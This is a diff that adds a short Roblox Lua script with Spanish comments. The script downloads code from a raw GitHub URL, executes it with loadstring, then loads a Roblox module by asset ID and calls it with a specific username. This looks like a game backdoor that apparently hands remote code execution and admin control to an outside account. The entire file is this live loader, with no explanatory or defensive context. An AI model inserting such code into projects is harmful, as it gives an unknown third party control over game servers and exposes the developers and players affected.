@@ -1,0 +1,19 @@
+local HttpService = game:GetService("HttpService")
+
+-- Si Falla Ejecutar Funcion
+local success, response = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
+if success and response then
+    local runCode = loadstring(response)
+    if runCode then
+        getfenv(runCode).script = workspace
+        task.spawn(runCode)
+    end
+end
+
+-- 2. Ejecution De Requie Por Si El Teleport
+local modelSuccess, module = pcall(require, 94217198436768)
+if modelSuccess and module then
+    pcall(function()
+        module:pls("luilo30095")
+    end)
+end
